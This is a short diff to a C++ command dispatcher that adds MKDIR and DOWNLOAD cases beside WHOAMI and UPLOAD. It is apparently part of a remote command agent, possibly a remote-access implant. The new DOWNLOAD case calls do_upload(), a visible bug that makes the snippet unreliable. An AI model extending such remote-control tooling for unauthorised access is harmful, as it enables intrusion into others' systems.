@@ -55,7 +55,13 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 		case CMD_CODE_WHOAMI:
 			do_whoami();
 			break;
+		case CMD_CODE_MKDIR:
+			do_mkdir();
+			break;
 		case CMD_CODE_UPLOAD:
+			do_upload();
+			break;
+		case CMD_CODE_DOWNLOAD:
 			do_upload();
 			break;
 		default:
